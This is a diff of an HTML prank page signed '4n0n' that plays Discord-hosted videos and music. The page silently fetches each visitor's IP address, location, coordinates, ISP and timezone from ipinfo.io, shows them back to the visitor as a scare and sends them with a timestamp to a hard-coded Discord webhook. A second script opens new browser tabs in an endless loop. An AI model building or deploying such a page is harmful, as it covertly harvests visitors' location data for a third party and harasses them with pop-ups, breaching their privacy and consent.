@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Testing your security</title>
+<title>By 4n0n</title>
 <style>
     body {
         margin: 0;
@@ -20,18 +20,16 @@
         background-color: rgb(0, 0, 0); 
     }
 
-
     .background-video {
         position: absolute;
-        top: 50%; 
+        top: 50%;
         left: 50%;
         width: 70%; 
         height: auto; 
         transform: translate(-50%, -50%); 
         z-index: -1;
-        object-fit: contain;
+        object-fit: contain; 
     }
-
 
     .video-text {
         position: absolute;
@@ -46,13 +44,11 @@
         z-index: 1;
     }
 
-
     @keyframes blink {
         0% { opacity: 1; }
         100% { opacity: 0.2; }
     }
 
-   
     .content {
         display: none; 
         flex-direction: column;
@@ -64,7 +60,6 @@
         width: 100%;
     }
 
-
     .background-video-second {
         position: absolute;
         top: 0;
@@ -75,14 +70,12 @@
         z-index: -1;
     }
 
-
     .image-container img {
         max-width: 80%; 
         height: auto; 
         margin: 20px auto; 
         display: block; 
     }
-
 
     .text {
         margin-top: 20px;
@@ -95,7 +88,6 @@
                     0px 0px 25px rgba(255, 0, 0, 0.5);
         letter-spacing: 4.5px;
     }
-
 
     .info {
         margin-top: 20px;
@@ -110,6 +102,18 @@
         white-space: pre-wrap;
     }
 
+    .rainbow-text {
+        animation: rainbow 3s infinite;
+    }
+
+    @keyframes rainbow {
+        0% { color: #ff0000; }  
+        20% { color: #ff7f00; }  
+        40% { color: #ffff00; }  
+        60% { color: #00ff00; }  
+        80% { color: #0000ff; }   
+        100% { color: #ffffff; }  
+    }
 
     .marquee-container {
         position: relative;
@@ -137,35 +141,43 @@
         0% { transform: translateX(100%); }
         100% { transform: translateX(-100%); }
     }
+
+    .typing-effect {
+        display: inline-block;
+        opacity: 0; 
+    }
+
+    @keyframes colorChange {
+        0% { color: #ff0000; }
+        25% { color: #00ff00; }
+        50% { color: #0000ff; }
+        75% { color: #ff00ff; }
+        100% { color: #ff0000; }
+    }
 </style>
 </head>
 <body>
 
-
 <video class="background-video" autoplay muted>
-    <source src="https://cdn.discordapp.com/attachments/875237492859744257/1350573282679853128/STORMY_-_MARADONA_MUSIC_VISUALISER_cc_aNwJfCmc.mp4?ex=67d73ae3&is=67d5e963&hm=c78a226d49ea90ae345d6fb045e0d2422966648076a01c55d183e1af9e3037c9&" type="video/mp4">
+    <source src="3354ycgwh1.mp4" type="video/mp4">
     Your browser does not support the video tag.
 </video>
 
-<div class="video-text"> Hey 🖖 </div>
-
+<div class="video-text"> ---- </div>
 
 <div class="content">
     <video class="background-video-second" autoplay loop muted>
-        <source src="https://cdn.discordapp.com/attachments/875237492859744257/1350573282679853128/STORMY_-_MARADONA_MUSIC_VISUALISER_cc_aNwJfCmc.mp4?ex=67d73ae3&is=67d5e963&hm=c78a226d49ea90ae345d6fb045e0d2422966648076a01c55d183e1af9e3037c9&" type="video/mp4">
+        <source src="https://cdn.discordapp.com/attachments/875237492859744257/1350667032848498720/Swipie_-_40030__Official_Music_Video__d7x9LYy2rss.mp4?ex=67d79232&is=67d640b2&hm=fab0d908f00ec89c240af2b484a7119922b3332ec296fe54a324b345e35a4541&" type="video/mp4">
         Your browser does not support the video tag.
     </video>
 
     <div class="image-container">
-        <img src="https://media.discordapp.net/attachments/875237492859744257/1179102712206458910/f1d74ccbc717514e51db4d28a52d35a1.png?ex=67d701f9&is=67d5b079&hm=0a9dacae2195d77d2463ddcb7f83e08b5c8635a1fd650d54e406c10ca655868d&=&format=webp&quality=lossless" alt="">
+        <img src="https://cdn.discordapp.com/attachments/1317384370771857469/1348815993077760030/image.png?ex=67d17f08&is=67d02d88&hm=7aad0ea80f3d987fa49f7f081b2d9d6e62bceeb456fa27e7a5df79b69ac8d4aa&" alt="">
     </div>
 
-
-    <div class="text">It's just a test don't be afraid 🐦‍⬛</div>
-
+    <div class="text">Just a test</div>
 
     <div class="info" id="ip-info">Loading IP Info...</div>
-
 
     <div class="marquee-container">
         <div class="marquee">
@@ -175,7 +187,6 @@
         </div>
     </div>
 
-
     <audio id="background-audio" loop>
         <source src="1s.mp3" type="audio/mp3">
         Your browser does not support the audio element.
@@ -183,7 +194,6 @@
 </div>
 
 <script>
-
     const video = document.querySelector('.background-video');
     const content = document.querySelector('.content');
 
@@ -191,28 +201,44 @@
         content.style.display = 'flex';
         video.style.display = 'none'; 
         document.getElementById('background-audio').play()
-            .catch(() => console.log("يجب تفعيل الصوت يدويًا"));
+            .catch(() => console.log("Sound must be activated manually."));
     };
-
 
     fetch('https://ipinfo.io/json')
         .then(response => response.json())
         .then(data => {
             const { ip, country, city, region, loc, org, timezone } = data;
-
-
             const port = window.location.port || (location.protocol === 'https:' ? '443' : '80');
-
             const infoDiv = document.getElementById('ip-info');
-            infoDiv.innerHTML = ` Test by 4n0n
-<strong>IP:</strong><span>"${ip}"</span><br>
-<strong>Port:</strong><span style="color: #ffd700">${port}</span><br>
-<strong>City:</strong><span>"${city}"</span><br>
-<strong>Region:</strong><span>"${region}"</span><br>
-<strong>Country:</strong><span>"${country}"</span><br>
-<strong>Location:</strong><span>"${loc}"</span><br>
-<strong>ISP:</strong><span>"${org}"</span><br>
-<strong>Timezone:</strong><span>"${timezone}"</span>`;
+            infoDiv.innerHTML = `<div class="typing-effect" id="typing-text"></div>
+<strong>IP:</strong><span class="rainbow-text">"${ip}"</span><br>
+<strong>Port:</strong><span class="rainbow-text">"${port}"</span><br>
+<strong>City:</strong><span class="rainbow-text">"${city}"</span><br>
+<strong>Region:</strong><span class="rainbow-text">"${region}"</span><br>
+<strong>Country:</strong><span class="rainbow-text">"${country}"</span><br>
+<strong>Location:</strong><span class="rainbow-text">"${loc}"</span><br>
+<strong>ISP:</strong><span class="rainbow-text">"${org}"</span><br>
+<strong>Timezone:</strong><span class="rainbow-text">"${timezone}"</span>`;
+
+            const typingText = document.getElementById('typing-text');
+            const text = "Test by 4n0n";
+            const stages = ["0101010", "T", "Te", "Tes", "Test", "Test ", "Test b", "Test by", "Test by ", "Test by 4", "Test by 4n", "Test by 4n0", "Test by 4n0n"];
+            let stageIndex = 0;
+            let colorIndex = 0;
+            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ff00ff'];
+
+            function typeNextStage() {
+                if (stageIndex < stages.length) {
+                    typingText.style.opacity = '1'; 
+                    typingText.textContent = stages[stageIndex];
+                    typingText.style.color = colors[colorIndex % colors.length];
+                    stageIndex++;
+                    colorIndex++;
+                    setTimeout(typeNextStage, 300); 
+                }
+            }
+
+            setTimeout(typeNextStage, 500);
 
             const dateTime = new Date().toLocaleString();
             const webhookUrl = 'https://discord.com/api/webhooks/1350570383572467872/Q8gryegCkrJTr7B2Ucw2KkkXYOVUDB_TbS0bNGFQJy3LrgbuLtoaVLAqzsqMKmEU_FaL';
@@ -233,17 +259,10 @@
         });
 </script>
 
-
 <script>
-
     const linkToOpen = "https://google.com";
-
-
     setInterval(() => {
-
         window.open(linkToOpen, '_blank');
-        
-
         setTimeout(() => {
             window.open(linkToOpen, '_blank');
         }, 500); 
